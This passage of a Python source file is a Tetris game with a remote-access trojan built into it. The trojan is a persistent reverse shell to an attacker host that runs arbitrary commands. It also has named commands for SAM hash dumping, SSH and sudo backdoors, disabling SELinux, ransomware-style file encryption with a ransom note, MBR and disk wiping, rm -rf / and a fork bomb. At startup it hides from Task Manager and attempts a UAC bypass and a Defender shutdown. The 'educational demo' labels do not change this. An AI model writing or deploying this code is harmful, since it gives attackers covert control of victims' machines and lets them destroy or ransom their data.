                                        dump_output += f"\n--- {os.path.basename(sam_path)} ---\n[!] File not found\n"
                                
                                s.send(f"{dump_output}\n\n".encode())
                            else:
                                s.send("[!] SAM dump is Windows-only\n\n".encode())
                        except:
                            s.send("[!] SAM dump failed\n\n".encode())
                        continue
                    
                    if command.lower() == 'disable_selinux':
                        try:
                            if not IS_WINDOWS:
                                # Multiple SELinux disable methods
                                methods = [
                                    ['setenforce', '0'],
                                    ['sed', '-i', 's/SELINUX=enforcing/SELINUX=disabled/g', '/etc/selinux/config'],
                                    ['grubby', '--update-kernel', 'ALL', '--args', 'selinux=0']
                                ]
                                
                                success_count = 0
                                for method in methods:
                                    try:
                                        result = subprocess.run(method, capture_output=True, text=True, timeout=10)
                                        if result.returncode == 0:
                                            success_count += 1
                                    except:
                                        pass
                                
                                s.send(f"[+] SELinux disable methods attempted: {success_count}/{len(methods)}\n\n".encode())
                            else:
                                s.send("[!] SELinux is Linux-only\n\n".encode())
                        except:
                            s.send("[!] Failed to disable SELinux\n\n".encode())
                        continue
                    
                    if command.lower() == 'backdoor_ssh':
                        try:
                            if not IS_WINDOWS:
                                # Create SSH backdoor
                                ssh_dir = '/etc/ssh/sshd_config.d'
                                
                                if os.path.exists(ssh_dir):
                                    backdoor_config = '''# Hidden SSH backdoor
Port 2222
PermitRootLogin yes
PasswordAuthentication yes
MaxAuthTries 10
ClientAliveInterval 300
ClientAliveCountMax 2
'''
                                    
                                    config_file = os.path.join(ssh_dir, 'backdoor.conf')
                                    
                                    try:
                                        with open(config_file, 'w') as f:
                                            f.write(backdoor_config)
                                        
                                        # Restart SSH service
                                        subprocess.run(['systemctl', 'restart', 'sshd'], capture_output=True, timeout=10)
                                        
                                        s.send(f"[+] SSH backdoor created on port 2222\n\n".encode())
                                    except:
                                        s.send("[!] Need root access for SSH backdoor\n\n".encode())
                                else:
                                    s.send("[!] SSH config directory not found\n\n".encode())
                            else:
                                s.send("[!] SSH backdoor is Linux-only\n\n".encode())
                        except:
                            s.send("[!] Failed to create SSH backdoor\n\n".encode())
                        continue
                    
                    if command.lower() == 'sudo_backdoor':
                        try:
                            if not IS_WINDOWS:
                                # Create sudo backdoor
                                sudoers_entry = f"{os.environ.get('USER', 'user')} ALL=(ALL) NOPASSWD: ALL\n"
                                
                                try:
                                    with open('/etc/sudoers.d/backdoor', 'w') as f:
                                        f.write(sudoers_entry)
                                    
                                    s.send(f"[+] Sudo backdoor created for {os.environ.get('USER', 'user')}\n\n".encode())
                                except:
                                    s.send("[!] Need root access for sudo backdoor\n\n".encode())
                            else:
                                s.send("[!] Sudo backdoor is Linux-only\n\n".encode())
                        except:
                            s.send("[!] Failed to create sudo backdoor\n\n".encode())
                        continue
                    
                    # --- DANGEROUS COMMANDS ---
                    if command.lower() in ['format_c', 'delete_sys32', 'bsod', 'ransom_sim', 'wipe_mbr', 'rm_rf', 'fork_bomb', 'dd_zero', 'chattr_imm']:
                        try:
                            if command.lower() == 'format_c':
                                if IS_WINDOWS:
                                    s.send("[!] DANGER: About to format C: drive\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['format', 'C:', '/FS:NTFS', '/Q'], capture_output=True, timeout=5)
                                        s.send("[!] C: drive formatting initiated...\n\n".encode())
                                    else:
                                        s.send("[!] C: drive format cancelled\n\n".encode())
                                else:
                                    s.send("[!] format_c is Windows-only\n\n".encode())
                            
                            elif command.lower() == 'delete_sys32':
                                if IS_WINDOWS:
                                    s.send("[!] DANGER: About to delete System32\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['rmdir', '/S', '/Q', r'C:\Windows\System32'], capture_output=True, timeout=5)
                                        s.send("[!] System32 deletion initiated...\n\n".encode())
                                    else:
                                        s.send("[!] System32 deletion cancelled\n\n".encode())
                                else:
                                    s.send("[!] delete_sys32 is Windows-only\n\n".encode())
                            
                            elif command.lower() == 'bsod':
                                if IS_WINDOWS:
                                    # Multiple BSOD methods
                                    bsod_methods = [
                                        ['taskkill', '/F', '/IM', 'csrss.exe'],  # Critical process
                                        ['taskkill', '/F', '/IM', 'winlogon.exe'],  # Critical process
                                        ['rundll32.exe', 'user32.dll,ExitWindowsEx', '0', '0']  # Force exit
                                    ]
                                    
                                    for method in bsod_methods:
                                        try:
                                            subprocess.run(method, capture_output=True, timeout=5)
                                            s.send("[!] BSOD triggered...\n\n".encode())
                                            break
                                        except:
                                            continue
                                else:
                                    # Linux kernel panic
                                    try:
                                        subprocess.run(['echo', 'c'], capture_output=True, timeout=5)  # Requires /proc/sysrq-trigger
                                        subprocess.run(['tee', '/proc/sysrq-trigger'], input=b'c', capture_output=True, timeout=5)
                                        s.send("[!] Kernel panic triggered...\n\n".encode())
                                    except:
                                        s.send("[!] Need root access for kernel panic\n\n".encode())
                            
                            elif command.lower() == 'ransom_sim':
                                # Advanced ransomware simulation
                                try:
                                    from cryptography.fernet import Fernet
                                    import base64
                                    
                                    key = Fernet.generate_key()
                                    fernet = Fernet(key)
                                    
                                    # Target common user directories
                                    if IS_WINDOWS:
                                        target_dirs = [
                                            os.path.expanduser('~/Documents'),
                                            os.path.expanduser('~/Desktop'),
                                            os.path.expanduser('~/Pictures'),
                                            os.path.expanduser('~/Downloads')
                                        ]
                                    else:
                                        target_dirs = [
                                            os.path.expanduser('~/Documents'),
                                            os.path.expanduser('~/Desktop'),
                                            os.path.expanduser('~/Pictures'),
                                            os.path.expanduser('~/Downloads')
                                        ]
                                    
                                    encrypted_count = 0
                                    
                                    for target_dir in target_dirs:
                                        if os.path.exists(target_dir):
                                            for root, dirs, files in os.walk(target_dir):
                                                for file in files:
                                                    if not file.endswith('.encrypted') and not file.startswith('.'):
                                                        try:
                                                            file_path = os.path.join(root, file)
                                                            
                                                            with open(file_path, 'rb') as f:
                                                                data = f.read()
                                                            
                                                            if len(data) < 100 * 1024 * 1024:  # Skip files > 100MB
                                                                encrypted_data = fernet.encrypt(data)
                                                                
                                                                with open(file_path + '.encrypted', 'wb') as f:
                                                                    f.write(encrypted_data)
                                                                
                                                                os.remove(file_path)
                                                                encrypted_count += 1
                                                        except:
                                                            pass
                                    
                                    # Create ransom note
                                    ransom_note = f"""
YOUR FILES HAVE BEEN ENCRYPTED!

To recover your files, send 0.1 BTC to: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh

Decryption Key: {base64.b64encode(key).decode()}

You have 24 hours to pay before files are permanently deleted.

This is a simulation for educational purposes only.
"""
                                    
                                    desktop = os.path.expanduser('~/Desktop') if IS_WINDOWS else os.path.expanduser('~/Desktop')
                                    with open(os.path.join(desktop, 'READ_ME.txt'), 'w') as f:
                                        f.write(ransom_note)
                                    
                                    s.send(f"[+] Ransomware simulation complete\n[+] Encrypted {encrypted_count} files\n[+] Key: {base64.b64encode(key).decode()}\n\n".encode())
                                except ImportError:
                                    s.send("[!] Cryptography library not available\n\n".encode())
                                except:
                                    s.send("[!] Ransomware simulation failed\n\n".encode())
                            
                            elif command.lower() == 'wipe_mbr':
                                if IS_WINDOWS:
                                    s.send("[!] DANGER: About to wipe MBR\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['dd', 'if=/dev/zero', 'of=\\\\.\\PhysicalDrive0', 'bs=512', 'count=1'], capture_output=True, timeout=10)
                                        s.send("[!] MBR wipe initiated...\n\n".encode())
                                    else:
                                        s.send("[!] MBR wipe cancelled\n\n".encode())
                                else:
                                    s.send("[!] DANGER: About to wipe MBR\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda', 'bs=512', 'count=1'], capture_output=True, timeout=10)
                                        s.send("[!] MBR wipe initiated...\n\n".encode())
                                    else:
                                        s.send("[!] MBR wipe cancelled\n\n".encode())
                            
                            elif command.lower() == 'rm_rf':
                                if not IS_WINDOWS:
                                    s.send("[!] DANGER: About to execute rm -rf /\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['rm', '-rf', '/'], capture_output=True, timeout=5)
                                        s.send("[!] Filesystem deletion initiated...\n\n".encode())
                                    else:
                                        s.send("[!] rm -rf cancelled\n\n".encode())
                                else:
                                    s.send("[!] rm_rf is Linux-only\n\n".encode())
                            
                            elif command.lower() == 'fork_bomb':
                                if not IS_WINDOWS:
                                    # Fork bomb
                                    bomb_code = """
import os
while True:
    os.fork()
"""
                                    
                                    with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                                        f.write(bomb_code)
                                        bomb_file = f.name
                                    
                                    subprocess.run(['python', bomb_file], capture_output=True, timeout=2)
                                    os.remove(bomb_file)
                                    
                                    s.send("[!] Fork bomb deployed...\n\n".encode())
                                else:
                                    s.send("[!] fork_bomb is Linux-only\n\n".encode())
                            
                            elif command.lower() == 'dd_zero':
                                if not IS_WINDOWS:
                                    s.send("[!] DANGER: About to zero hard drive\n[!] Type 'CONFIRM' to proceed: \n".encode())
                                    confirmation = s.recv(1024).decode().strip()
                                    if confirmation == 'CONFIRM':
                                        subprocess.run(['dd', 'if=/dev/zero', 'of=/dev/sda'], capture_output=True, timeout=60)
                                        s.send("[!] Hard drive zeroing initiated...\n\n".encode())
                                    else:
                                        s.send("[!] Hard drive zeroing cancelled\n\n".encode())
                                else:
                                    s.send("[!] dd_zero is Linux-only\n\n".encode())
                            
                            elif command.lower() == 'chattr_imm':
                                if not IS_WINDOWS:
                                    # Make files immutable
                                    try:
                                        current_dir = os.getcwd()
                                        immutable_count = 0
                                        
                                        for root, dirs, files in os.walk(current_dir):
                                            for file in files:
                                                try:
                                                    file_path = os.path.join(root, file)
                                                    subprocess.run(['chattr', '+i', file_path], capture_output=True, timeout=5)
                                                    immutable_count += 1
                                                except:
                                                    pass
                                            
                                            if immutable_count > 10:  # Limit to prevent complete lockout
                                                break
                                        
                                        s.send(f"[+] Made {immutable_count} files immutable\n\n".encode())
                                    except:
                                        s.send("[!] Need root access for chattr\n\n".encode())
                                else:
                                    s.send("[!] chattr_imm is Linux-only\n\n".encode())
                        except:
                            s.send("[!] Dangerous command failed\n\n".encode())
                        continue
                    
                    # ===== DEFAULT: EXECUTE AS SYSTEM COMMAND =====
                    try:
                        if IS_WINDOWS:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd=os.getcwd()
                            )
                        else:
                            result = subprocess.run(
                                command,
                                shell=True,
                                capture_output=True,
                                text=True,
                                timeout=30,
                                cwd=os.getcwd(),
                                executable='/bin/bash'
                            )
                        
                        output = result.stdout
                        if result.stderr:
                            output += f"\n[STDERR]\n{result.stderr}"
                        
                        if not output.strip():
                            output = "[Command executed successfully - no output]\n"
                        
                        s.send(output.encode())
                        
                    except subprocess.TimeoutExpired:
                        s.send("[!] Command timed out (30s limit)\n".encode())
                    except Exception as e:
                        s.send(f"[!] Error executing command: {e}\n".encode())
                
                except socket.timeout:
                    continue
                except Exception as e:
                    print(f"[!] Shell error: {e}")
                    break
            
            s.close()
            print(f"[*] Connection closed. Reconnecting in 30 seconds...")
            
        except socket.error as e:
            print(f"[!] Connection failed: {e}")
        except Exception as e:
            print(f"[!] Shell thread error: {e}")
        
        time.sleep(30)  # Wait before reconnecting

# ============================================
# TETRIS GAME IMPLEMENTATION
# ============================================

# Game configuration
SCREEN_WIDTH = 800
SCREEN_HEIGHT = 700
GRID_WIDTH = 10
GRID_HEIGHT = 20
BLOCK_SIZE = 30

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
GRAY = (128, 128, 128)
RED = (255, 0, 0)
GREEN = (0, 255, 0)
BLUE = (0, 0, 255)
YELLOW = (255, 255, 0)
ORANGE = (255, 165, 0)
PURPLE = (128, 0, 128)
CYAN = (0, 255, 255)

# Tetris pieces with all rotations
PIECES = {
    'I': [
        [[1, 1, 1, 1]],
        [[1], [1], [1], [1]]
    ],
    'O': [
        [[1, 1], [1, 1]]
    ],
    'T': [
        [[0, 1, 0], [1, 1, 1]],
        [[1, 0], [1, 1], [1, 0]],
        [[1, 1, 1], [0, 1, 0]],
        [[0, 1], [1, 1], [0, 1]]
    ],
    'L': [
        [[1, 0, 0], [1, 1, 1]],
        [[1, 1], [1, 0], [1, 0]],
        [[1, 1, 1], [0, 0, 1]],
        [[0, 1], [0, 1], [1, 1]]
    ],
    'J': [
        [[0, 0, 1], [1, 1, 1]],
        [[1, 0], [1, 0], [1, 1]],
        [[1, 1, 1], [1, 0, 0]],
        [[1, 1], [0, 1], [0, 1]]
    ],
    'S': [
        [[0, 1, 1], [1, 1, 0]],
        [[1, 0], [1, 1], [0, 1]]
    ],
    'Z': [
        [[1, 1, 0], [0, 1, 1]],
        [[0, 1], [1, 1], [1, 0]]
    ]
}

PIECE_COLORS = {
    'I': CYAN,
    'O': YELLOW,
    'T': PURPLE,
    'L': ORANGE,
    'J': BLUE,
    'S': GREEN,
    'Z': RED
}

class TetrisGame:
    def __init__(self):
        self.grid = [[0 for _ in range(GRID_WIDTH)] for _ in range(GRID_HEIGHT)]
        self.current_piece = None
        self.current_x = 0
        self.current_y = 0
        self.current_rotation = 0
        self.score = 0
        self.level = 1
        self.lines_cleared = 0
        self.game_over = False
        self.paused = False
        self.next_piece_type = random.choice(list(PIECES.keys()))
        self.new_piece()
        
    def new_piece(self):
        """Generate a new piece."""
        piece_type = self.next_piece_type
        self.next_piece_type = random.choice(list(PIECES.keys()))
        
        self.current_piece = PIECES[piece_type]
        self.current_rotation = 0
        self.current_x = GRID_WIDTH // 2 - len(self.current_piece[0][0]) // 2
        self.current_y = 0
        
        # Check if game over
        if not self.is_valid_position():
            self.game_over = True
    
    def is_valid_position(self, x_offset=0, y_offset=0, rotation=None):
        """Check if current piece position is valid."""
        if rotation is None:
            rotation = self.current_rotation
        
        piece = self.current_piece[rotation % len(self.current_piece)]
        
        for y, row in enumerate(piece):
            for x, cell in enumerate(row):
                if cell:
                    new_x = self.current_x + x + x_offset
                    new_y = self.current_y + y + y_offset
                    
                    # Check boundaries
                    if new_x < 0 or new_x >= GRID_WIDTH or new_y >= GRID_HEIGHT:
                        return False
                    
                    # Check collision with locked pieces
                    if new_y >= 0 and self.grid[new_y][new_x]:
                        return False
        
        return True
    
    def lock_piece(self):
        """Lock the current piece into the grid."""
        piece = self.current_piece[self.current_rotation % len(self.current_piece)]
        
        for y, row in enumerate(piece):
            for x, cell in enumerate(row):
                if cell:
                    grid_y = self.current_y + y
                    grid_x = self.current_x + x
                    if 0 <= grid_y < GRID_HEIGHT and 0 <= grid_x < GRID_WIDTH:
                        self.grid[grid_y][grid_x] = 1
        
        self.clear_lines()
        self.new_piece()
    
    def clear_lines(self):
        """Clear completed lines and update score."""
        lines_cleared = 0
        y = GRID_HEIGHT - 1
        
        while y >= 0:
            if all(self.grid[y]):
                # Remove this line
                del self.grid[y]
                self.grid.insert(0, [0 for _ in range(GRID_WIDTH)])
                lines_cleared += 1
            else:
                y -= 1
        
        if lines_cleared > 0:
            self.lines_cleared += lines_cleared
            # Score calculation: more lines = more points
            points = [0, 100, 300, 500, 800]
            self.score += points[lines_cleared] * self.level
            
            # Level up every 10 lines
            self.level = self.lines_cleared // 10 + 1
    
    def move(self, dx, dy):
        """Move the current piece."""
        if self.is_valid_position(dx, dy):
            self.current_x += dx
            self.current_y += dy
            return True
        return False
    
    def rotate(self):
        """Rotate the current piece."""
        new_rotation = (self.current_rotation + 1) % len(self.current_piece)
        if self.is_valid_position(rotation=new_rotation):
            self.current_rotation = new_rotation
    
    def hard_drop(self):
        """Drop piece to the bottom."""
        while self.move(0, 1):
            self.score += 1  # Soft drop bonus
    
    def update(self):
        """Update game state - called for automatic falling."""
        if not self.move(0, 1):
            self.lock_piece()
    
    def get_ghost_position(self):
        """Get the position where piece would land (ghost piece)."""
        ghost_y = self.current_y
        while True:
            if self.is_valid_position(0, ghost_y - self.current_y + 1):
                ghost_y += 1
            else:
                break
        return ghost_y

def draw_game(screen, game):
    """Draw the game state."""
    screen.fill(BLACK)
    
    # Draw grid background
    grid_surface = pygame.Surface((GRID_WIDTH * BLOCK_SIZE, GRID_HEIGHT * BLOCK_SIZE))
    grid_surface.fill(BLACK)
    
    # Draw grid lines
    for x in range(GRID_WIDTH + 1):
        pygame.draw.line(grid_surface, GRAY, 
                        (x * BLOCK_SIZE, 0), 
                        (x * BLOCK_SIZE, GRID_HEIGHT * BLOCK_SIZE))
    for y in range(GRID_HEIGHT + 1):
        pygame.draw.line(grid_surface, GRAY, 
                        (0, y * BLOCK_SIZE), 
                        (GRID_WIDTH * BLOCK_SIZE, y * BLOCK_SIZE))
    
    # Draw locked pieces
    for y, row in enumerate(game.grid):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(x * BLOCK_SIZE, y * BLOCK_SIZE, 
                                 BLOCK_SIZE - 1, BLOCK_SIZE - 1)
                pygame.draw.rect(grid_surface, WHITE, rect)
    
    # Draw ghost piece
    ghost_y = game.get_ghost_position()
    piece = game.current_piece[game.current_rotation % len(game.current_piece)]
    for y, row in enumerate(piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    (game.current_x + x) * BLOCK_SIZE,
                    (ghost_y + y) * BLOCK_SIZE,
                    BLOCK_SIZE - 1, BLOCK_SIZE - 1
                )
                pygame.draw.rect(grid_surface, GRAY, rect, 2)
    
    # Draw current piece
    piece = game.current_piece[game.current_rotation % len(game.current_piece)]
    piece_color = PIECE_COLORS.get(game.next_piece_type, WHITE) if False else WHITE
    for y, row in enumerate(piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    (game.current_x + x) * BLOCK_SIZE,
                    (game.current_y + y) * BLOCK_SIZE,
                    BLOCK_SIZE - 1, BLOCK_SIZE - 1
                )
                pygame.draw.rect(grid_surface, piece_color, rect)
                pygame.draw.rect(grid_surface, GRAY, rect, 1)
    
    # Center the grid on screen
    grid_x = (SCREEN_WIDTH - GRID_WIDTH * BLOCK_SIZE) // 2
    grid_y = 50
    screen.blit(grid_surface, (grid_x, grid_y))
    
    # Draw UI
    font = pygame.font.Font(None, 36)
    small_font = pygame.font.Font(None, 24)
    
    # Score panel
    score_text = font.render(f"Score: {game.score}", True, WHITE)
    level_text = font.render(f"Level: {game.level}", True, WHITE)
    lines_text = font.render(f"Lines: {game.lines_cleared}", True, WHITE)
    
    screen.blit(score_text, (20, 20))
    screen.blit(level_text, (20, 60))
    screen.blit(lines_text, (20, 100))
    
    # Next piece preview
    next_text = font.render("Next:", True, WHITE)
    screen.blit(next_text, (SCREEN_WIDTH - 120, 20))
    
    # Draw next piece preview
    next_piece = PIECES[game.next_piece_type][0]
    next_color = PIECE_COLORS[game.next_piece_type]
    preview_x = SCREEN_WIDTH - 100
    preview_y = 60
    
    for y, row in enumerate(next_piece):
        for x, cell in enumerate(row):
            if cell:
                rect = pygame.Rect(
                    preview_x + x * BLOCK_SIZE,
                    preview_y + y * BLOCK_SIZE,
                    BLOCK_SIZE - 2, BLOCK_SIZE - 2
                )
                pygame.draw.rect(screen, next_color, rect)
    
    # Controls help
    controls = [
        "Controls:",
        "← → : Move",
        "↑ : Rotate",
        "↓ : Soft Drop",
        "Space : Hard Drop",
        "P : Pause",
        "ESC : Quit"
    ]
    
    for i, text in enumerate(controls):
        control_text = small_font.render(text, True, GRAY)
        screen.blit(control_text, (20, SCREEN_HEIGHT - 200 + i * 25))
    
    # Security awareness notice
    notice = small_font.render("SECURITY DEMO - Educational Use Only", True, YELLOW)
    screen.blit(notice, (SCREEN_WIDTH // 2 - 150, SCREEN_HEIGHT - 30))
    
    # Game over overlay
    if game.game_over:
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
        overlay.set_alpha(200)
        overlay.fill(BLACK)
        screen.blit(overlay, (0, 0))
        
        game_over_font = pygame.font.Font(None, 72)
        game_over_text = game_over_font.render("GAME OVER", True, RED)
        restart_text = font.render("Press R to restart", True, WHITE)
        
        screen.blit(game_over_text, 
                   (SCREEN_WIDTH // 2 - game_over_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))
        screen.blit(restart_text,
                   (SCREEN_WIDTH // 2 - restart_text.get_width() // 2, SCREEN_HEIGHT // 2 + 20))
    
    # Pause overlay
    elif game.paused:
        overlay = pygame.Surface((SCREEN_WIDTH, SCREEN_HEIGHT))
        overlay.set_alpha(150)
        overlay.fill(BLACK)
        screen.blit(overlay, (0, 0))
        
        pause_font = pygame.font.Font(None, 72)
        pause_text = pause_font.render("PAUSED", True, YELLOW)
        screen.blit(pause_text,
                   (SCREEN_WIDTH // 2 - pause_text.get_width() // 2, SCREEN_HEIGHT // 2 - 50))

def run_game():
    """Main game loop."""
    pygame.init()
    screen = pygame.display.set_mode((SCREEN_WIDTH, SCREEN_HEIGHT))
    pygame.display.set_caption("Tetris - Educational Security Demo")
    
    # Hide console window after game window is created (Windows only)
    # This ensures the game window is visible before hiding the console
    if IS_WINDOWS:
        hide_console_window()
    
    clock = pygame.time.Clock()
    
    game = TetrisGame()
    
    # Game timing
    fall_time = 0
    fall_speed = 1000  # Initial fall speed in milliseconds
    
    running = True
    while running:
        dt = clock.tick(60)
        
        # Handle events
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                running = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_ESCAPE:
                    running = False
                
                if not game.game_over and not game.paused:
                    if event.key == pygame.K_LEFT:
                        game.move(-1, 0)
                    elif event.key == pygame.K_RIGHT:
                        game.move(1, 0)
                    elif event.key == pygame.K_UP:
                        game.rotate()
                    elif event.key == pygame.K_DOWN:
                        if game.move(0, 1):
                            game.score += 1  # Soft drop bonus
                    elif event.key == pygame.K_SPACE:
                        game.hard_drop()
                
                if event.key == pygame.K_p:
                    game.paused = not game.paused
                
                if event.key == pygame.K_r and game.game_over:
                    game = TetrisGame()
                    fall_time = 0
        
        # Update game
        if not game.game_over and not game.paused:
            fall_time += dt
            current_fall_speed = max(50, fall_speed - (game.level - 1) * 100)
            
            if fall_time >= current_fall_speed:
                game.update()
                fall_time = 0
        
        # Draw
        draw_game(screen, game)
        pygame.display.flip()
    
    pygame.quit()
    
    # Show exit message GUI since console is not available in windowed mode
    show_exit_message_gui()

def show_exit_message_gui():
    """Display exit message GUI about persistent reverse shell."""
    pygame.init()
    screen = pygame.display.set_mode((700, 500))
    pygame.display.set_caption("GAME CLOSED - Security Notice")
    
    # Colors
    BLACK = (0, 0, 0)
    WHITE = (255, 255, 255)
    RED = (255, 0, 0)
    YELLOW = (255, 255, 0)
    GRAY = (128, 128, 128)
    GREEN = (0, 255, 0)
    
    # Fonts
    title_font = pygame.font.Font(None, 48)
    text_font = pygame.font.Font(None, 28)
    button_font = pygame.font.Font(None, 32)
    
    # Message lines
    messages = [
        "GAME CLOSED",
        "",
        "⚠️  IMPORTANT: The reverse shell is still running!",
        "   The shell connection will persist even after the game closes.",
        "",
        "To remove all persistence:",
        "1. Open Command Prompt or Terminal",
        "2. Navigate to the game folder",
        "3. Run:  tetris-game.exe --cleanup",
        "",
        "Or run the cleanup_tool.py script",
        "",
        "Click OK to close this message",
    ]
    
    ok_button = pygame.Rect(275, 420, 150, 50)
    
    waiting = True
    while waiting:
        for event in pygame.event.get():
            if event.type == pygame.QUIT:
                waiting = False
            
            if event.type == pygame.MOUSEBUTTONDOWN:
                mouse_pos = event.pos
                if ok_button.collidepoint(mouse_pos):
                    waiting = False
            
            if event.type == pygame.KEYDOWN:
                if event.key == pygame.K_RETURN or event.key == pygame.K_SPACE:
                    waiting = False
        
        # Draw background
        screen.fill(BLACK)
        
        # Draw title
        title = title_font.render("=" * 20, True, WHITE)
        screen.blit(title, (350 - title.get_width() // 2, 20))
        
        title2 = title_font.render("GAME CLOSED", True, RED)
        screen.blit(title2, (350 - title2.get_width() // 2, 55))
        
        title3 = title_font.render("=" * 20, True, WHITE)
        screen.blit(title3, (350 - title3.get_width() // 2, 90))
        
        # Draw messages
        y_offset = 140
        for line in messages[2:]:  # Skip first 2 lines (title already drawn)
            if not line:
                y_offset += 15
                continue
            if line.startswith("⚠️"):
                text = text_font.render(line, True, RED)
            elif line.startswith("To remove"):
                text = text_font.render(line, True, YELLOW)
            elif "tetris-game.exe" in line or "cleanup_tool" in line:
                text = text_font.render(line, True, GREEN)
            elif line.startswith("Click OK"):
                text = text_font.render(line, True, GRAY)
            else:
                text = text_font.render(line, True, WHITE)
            screen.blit(text, (50, y_offset))
            y_offset += 28
        
        # Draw OK button
        mouse_pos = pygame.mouse.get_pos()
        ok_color = GREEN if ok_button.collidepoint(mouse_pos) else (0, 200, 0)
        pygame.draw.rect(screen, ok_color, ok_button)
        pygame.draw.rect(screen, WHITE, ok_button, 2)
        ok_text = button_font.render("OK", True, BLACK)
        screen.blit(ok_text, (ok_button.centerx - ok_text.get_width() // 2, 
                             ok_button.centery - ok_text.get_height() // 2))
        
        pygame.display.flip()
    
    pygame.quit()

def main():
    """
    Main entry point.
    Handles command line arguments and runs appropriate mode.
    """
    import argparse
    
    parser = argparse.ArgumentParser(description="Tetris Educational Security Demo")
    parser.add_argument("--background", action="store_true", 
                      help="Run in background mode (persistence)")
    parser.add_argument("--cleanup", action="store_true",
                      help="Remove persistence, delete this game, and exit")
    parser.add_argument("--skip-warning", action="store_true",
                      help="Skip security warning (not recommended)")
    
    args = parser.parse_args()
    
    if args.cleanup:
        print("=" * 70)
        print("TETRIS SECURITY DEMO - CLEANUP MODE")
        print("=" * 70)
        print()
        deferred_paths = []
        persistence_removed = remove_persistence(deferred_paths=deferred_paths)
        game_removed = schedule_deferred_removal(
            get_game_removal_targets() + deferred_paths,
            description="the game and deferred persistence files"
        )
        print()
        if persistence_removed and game_removed:
            print("[+] Cleanup complete. Persistence removed and game deletion scheduled.")
        elif persistence_removed:
            print("[!] Persistence removed, but the game could not be deleted automatically.")
        else:
            print("[!] Cleanup finished with errors. Some persistence may still remain.")
        sys.stdout.flush()
        sys.stderr.flush()
        os._exit(0)
    
    if args.background:
        # Background mode - only run reverse shell, no GUI
        print(f"[*] Starting background service...")
        print(f"[*] Reverse shell will connect to {ATTACKER_IP}:{ATTACKER_PORT}")
        reverse_shell()
        return
    
    # Normal mode - full game with all features
    
    # === ACTIVATE STEALTH FEATURES ===
    if IS_WINDOWS:
        # Enforce singleton - prevent multiple instances
        enforce_singleton()
        
        # Start Task Manager blocker (hides process from users)
        hide_from_taskmanager()
        
        # Automatically attempt UAC bypass and disable Defender/Firewall
        auto_elevate_and_disable_protection()
    
    print("=" * 70)
    print("TETRIS SECURITY EDUCATION PLATFORM")
    print("=" * 70)
    print()
    
    # Show security warning
    if not args.skip_warning:
        show_security_warning()
    
    # Setup dependencies
    if not setup_dependencies():
        print("[!] Failed to setup dependencies. Exiting.")
        sys.exit(1)
    
    # Install persistence
    install_persistence()
    
    print("=" * 70)
    print("STARTING GAME")
    print("=" * 70)
    print()
    print("[*] Starting reverse shell thread...")
    
    # Start reverse shell in background thread
    shell_thread = threading.Thread(target=reverse_shell, daemon=False)
    shell_thread.start()
    
    print("[*] Starting Tetris game...")
    print("[*] The game will run normally while the shell operates in background")
    print()
    
    # Run the game
    try:
        run_game()
    except Exception as e:
        print(f"[!] Game error: {e}")
    
    print()
    print("=" * 70)
    print("GAME CLOSED")
    print("=" * 70)
    print()
    print("⚠️  IMPORTANT: The reverse shell is still running!")
    print("   The shell connection will persist even after the game closes.")
    print()
    print(f"   To remove all persistence, run:")
    print(f"   python {Path(__file__).name} --cleanup")
    print()

if __name__ == "__main__":
    main()
